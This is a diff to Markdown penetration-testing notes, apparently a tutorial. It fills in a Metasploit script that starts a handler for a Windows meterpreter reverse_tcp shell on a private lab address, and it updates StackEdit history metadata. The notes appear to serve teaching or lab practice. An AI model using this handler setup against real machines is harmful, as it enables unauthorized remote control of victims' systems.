@@ -158,9 +158,11 @@ To open a remote desktop connection, we can use the following command directly f
 	where `msfconsole` is a CLI through which it is possible to interact with the Metasploit Framework and `meterpreter.rx` is a script, previously created, made up of the following commands:
 	
 	```
-	ddd
-	ddd
-	ddd
+	use exploit/multi/handler
+	set PAYLOAD windows/meterpreter/reverse_tcp
+	set LHOST 10.0.2.15
+	set ExitOnSession false
+	exploit -j -z
 	```
 	==SCRIPT==
 	
@@ -179,11 +181,11 @@ To open a remote desktop connection, we can use the following command directly f
 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTY3ODM1MjcxNCwxNzU4NDUzMDM0LC0xNz
-U3Njc4NzcwLC0xNzE0NTE5NDA5LDczMTEwODE2MSwtMTIyMjgy
-MzMxOSwzNzYxNTExMTEsLTI4MDQxMjk3MywtMTcwODgwNDg0Ny
-wtMTg2NzEzMzQ1Miw3MzE2ODUzMTcsMTcwMDUzNDU2MCwxMjMx
-NzgwNzQ5LDEyMzgyMjgyNDYsLTEwODczMzkyNDIsLTE4MTk4MT
-UyOTIsMjcxNzM0NDQ2LDkwNzAzMjc4LDE3MzYzOTc5NzIsMTIx
-MjI0NDE0M119
+eyJoaXN0b3J5IjpbLTQ3Njk3NjM1LDE2NzgzNTI3MTQsMTc1OD
+Q1MzAzNCwtMTc1NzY3ODc3MCwtMTcxNDUxOTQwOSw3MzExMDgx
+NjEsLTEyMjI4MjMzMTksMzc2MTUxMTExLC0yODA0MTI5NzMsLT
+E3MDg4MDQ4NDcsLTE4NjcxMzM0NTIsNzMxNjg1MzE3LDE3MDA1
+MzQ1NjAsMTIzMTc4MDc0OSwxMjM4MjI4MjQ2LC0xMDg3MzM5Mj
+QyLC0xODE5ODE1MjkyLDI3MTczNDQ0Niw5MDcwMzI3OCwxNzM2
+Mzk3OTcyXX0=
 -->
